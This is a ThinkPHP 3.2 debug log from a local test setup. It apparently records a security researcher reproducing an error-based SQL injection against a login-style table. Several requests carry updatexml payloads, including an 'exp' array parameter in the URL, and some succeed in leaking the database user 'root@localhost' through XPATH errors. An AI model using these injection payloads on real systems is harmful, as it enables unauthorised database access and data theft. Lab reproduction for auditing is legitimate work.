INFO: [ app_begin ] --END-- [ RunTime:0.003239s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0321s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:59:50+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000195s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000618s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000782s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0286s ]
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: :
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = :0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T20:59:57+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000050s ]
INFO: [ app_init ] --END-- [ RunTime:0.000251s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000606s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000788s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0317s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T21:05:57+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000062s ]
INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000651s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000844s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0288s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002495s ]
INFO: [ app_end ] --END-- [ RunTime:0.003063s ]

[ 2019-04-02T21:07:32+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000643s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000810s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0155s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001022s ]
INFO: [ app_end ] --END-- [ RunTime:0.001300s ]

[ 2019-04-02T21:07:36+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000054s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001110s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001418s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0329s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002337s ]
INFO: [ app_end ] --END-- [ RunTime:0.003023s ]

[ 2019-04-02T21:07:56+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000198s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002099s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002306s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0305s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001359s ]
INFO: [ app_end ] --END-- [ RunTime:0.001729s ]

[ 2019-04-02T21:08:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000061s ]
INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000734s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000903s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0366s ]
NOTIC: [2] Invalid argument supplied for foreach() D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Model.class.php 第 267 行.
NOTIC: [2] Invalid argument supplied for foreach() D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 372 行.
NOTIC: [8] Undefined variable: set D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 387 行.
NOTIC: [2] implode(): Invalid arguments passed D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 387 行.
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1)' at line 1
 [ SQL语句 ] : UPDATE `test` SET  WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1)
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1)' at line 1
 [ SQL语句 ] : UPDATE `test` SET  WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1)
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:223) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T21:09:09+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000119s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002707s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002969s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0338s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ': 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` = : 0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T21:09:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000918s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001218s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0345s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name`  0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name`  0 and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T21:09:34+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000278s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000669s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000925s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0340s ]
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost1'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),1),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T21:11:54+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000739s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001025s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0247s ]

[ 2019-04-02T21:18:01+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000695s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000888s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0152s ]

[ 2019-04-02T21:23:03+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000042s ]
INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000621s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000803s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0286s ]

[ 2019-04-02T21:26:47+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000093s ]
INFO: [ app_init ] --END-- [ RunTime:0.000455s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000697s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000945s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0164s ]
NOTIC: [8] Undefined index: distinct xdebug://debug-eval(1) : eval()'d code 第 1 行.

[ 2019-04-02T21:30:19+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001144s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001501s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0200s ]

[ 2019-04-02T21:30:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000985s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001172s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0118s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000680s ]
INFO: [ app_end ] --END-- [ RunTime:0.000831s ]

[ 2019-04-02T21:59:49+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000062s ]
INFO: [ app_init ] --END-- [ RunTime:0.000380s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000999s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001297s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0237s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0009s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001103s ]
INFO: [ app_end ] --END-- [ RunTime:0.001411s ]

[ 2019-04-02T21:59:56+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
INFO: [ app_init ] --END-- [ RunTime:0.000193s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000608s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000774s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0307s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT `name`,`password` FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0010s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002222s ]
INFO: [ app_end ] --END-- [ RunTime:0.002864s ]

[ 2019-04-02T22:00:59+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000854s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001153s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0310s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T22:01:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index.php?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000123s ]
INFO: [ app_init ] --END-- [ RunTime:0.000734s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000836s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001096s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0167s ]
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
ERR: 1105:XPATH syntax error: '~root@localhost~'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,(select user()),0x7e),1) LIMIT 1  
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php:170) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

